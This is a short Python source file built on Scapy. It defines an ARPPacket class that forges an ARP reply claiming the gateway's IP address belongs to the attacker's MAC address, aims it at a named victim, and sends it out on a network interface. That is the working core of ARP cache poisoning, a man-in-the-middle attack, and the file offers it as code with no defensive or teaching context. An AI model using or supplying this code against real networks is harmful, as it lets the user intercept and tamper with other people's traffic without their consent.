from scapy.all import *

class ARPPacket:
    def __init__(self, attacker, victim, gateway, interface = "enp0s3"):
        arp = Ether() / ARP()
        arp[Ether].src = attacker.MAC
        arp[ARP].hwsrc = attacker.MAC

        arp[ARP].psrc = gateway.IP

        arp[ARP].hwdst = victim.MAC
        arp[ARP].pdst = victim.IP

        self.packet = arp
        self.iface = interface

    def get(self):
        return self.packet

    def send(self):
        sendp(self.packet, iface=self.iface)